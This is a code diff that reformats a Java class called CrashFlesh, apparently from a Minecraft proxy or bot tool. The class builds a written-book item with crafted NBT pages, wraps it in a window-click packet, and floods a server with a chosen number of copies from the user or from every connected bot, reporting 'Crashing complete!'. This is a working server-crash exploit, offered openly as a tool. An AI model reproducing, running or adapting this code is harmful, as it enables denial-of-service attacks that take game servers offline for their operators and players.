@@ -18,11 +18,11 @@ import java.util.stream.Collectors;
 import java.util.stream.IntStream;
 
 public class CrashFlesh extends Crash {
-    public CrashFlesh() {
-        super("flesh",CrashType.NBT);
-    }
-
     private Packet packet;
+
+    public CrashFlesh() {
+        super("flesh", CrashType.NBT);
+    }
 
     @SneakyThrows
     @Override
@@ -37,19 +37,19 @@ public class CrashFlesh extends Crash {
         final NBTTagList pages = new NBTTagList();
         list.forEach(pages::appendTag);
 
-        compound.setTag("pages",pages);
-        compound.setTag("title",new NBTTagString("ttProxy6146"));
-        compound.setTag("author",new NBTTagString("JZ9SNxES"));
+        compound.setTag("pages", pages);
+        compound.setTag("title", new NBTTagString("ttProxy6146"));
+        compound.setTag("author", new NBTTagString("JZ9SNxES"));
 
         final ItemStack stack = new ItemStack(386, 1, 0, compound);
 
-        this.packet = new ClientPlayerWindowActionPacket(0,(short)20,0, WindowAction.CLICK_ITEM,0,stack);
+        this.packet = new ClientPlayerWindowActionPacket(0, (short) 20, 0, WindowAction.CLICK_ITEM, 0, stack);
     }
 
     @Override
     public void execute(String message, Player sender) {
 
-        if(packet == null){
+        if (packet == null) {
             sender.sendChatMessage("&cFailed to initialize crash!");
             return;
         }
@@ -58,13 +58,13 @@ public class CrashFlesh extends Crash {
             final String[] args = message.split(" ");
             final int amount = Integer.parseInt(args[2]);
             if (sender.getBots().size() == 0) {
-                IntStream.range(0,amount).forEach(i -> sender.getConnector().sendPacket(packet));
+                IntStream.range(0, amount).forEach(i -> sender.getConnector().sendPacket(packet));
                 sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
             } else {
-                sender.getBots().forEach(b -> IntStream.range(0,amount).forEach(i -> b.getConnection().sendPacket(packet)));
+                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getConnection().sendPacket(packet)));
                 sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
             }
-        }catch(final Throwable t){
+        } catch (final Throwable t) {
             sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
         }
     }
